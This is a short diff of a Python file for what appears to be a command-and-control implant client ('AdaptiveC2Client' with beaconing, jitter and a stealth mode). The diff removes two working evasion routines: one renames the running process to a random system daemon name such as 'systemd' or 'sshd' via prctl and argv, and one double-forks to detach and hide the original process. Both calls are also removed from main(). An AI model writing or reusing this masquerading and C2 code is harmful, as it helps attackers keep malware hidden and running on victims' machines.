@@ -243,50 +243,6 @@ def send_message(endpoint, message="", oldStatus=True, newStatus=True,
         print_debug(f"send_message({url}): Beacon error: {e}")
     return False, ""
 
-def hide_process_name():
-    """Change the process name to something legitimate"""
-    try:
-        # Choose a legitimate system process name
-        new_name = random.choice([
-            "systemd", "kthreadd", "ksoftirqd", "migration", "rcu_gp",
-            "rsyslog", "networkd", "dbus-daemon", "cron", "sshd"
-        ])
-        
-        # Change process name using prctl (Linux)
-        ctypes.CDLL(None).prctl(15, new_name.encode())
-        
-        # Also modify argv to hide the script name
-        import sys
-        sys.argv[0] = new_name
-        
-        return True
-    except:
-        return False
-
-def fork_and_hide():
-    """Fork the process and exit the parent to hide the original process"""
-    try:
-        # Fork the process
-        pid = os.fork()
-        
-        if pid > 0:
-            # Parent process exits
-            os._exit(0)
-        
-        # Child process continues
-        os.setsid()
-        os.umask(0)
-        
-        # Fork again to prevent the process from acquiring a controlling terminal
-        pid = os.fork()
-        
-        if pid > 0:
-            # Second parent exits
-            os._exit(0)
-            
-        return True
-    except:
-        return False
 
 class AdaptiveC2Client:
     def __init__(self, c2_server, secret_key, sleep_time=60, jitter=20, stealth_mode=False):
@@ -558,10 +514,6 @@ class AdaptiveC2Client:
 
 # Integration with the existing code
 def main():
-
-    fork_and_hide()
-
-    hide_process_name()
 
     STEALTH_MODE = True
     # Perform our initial connection to the server to setup the agent
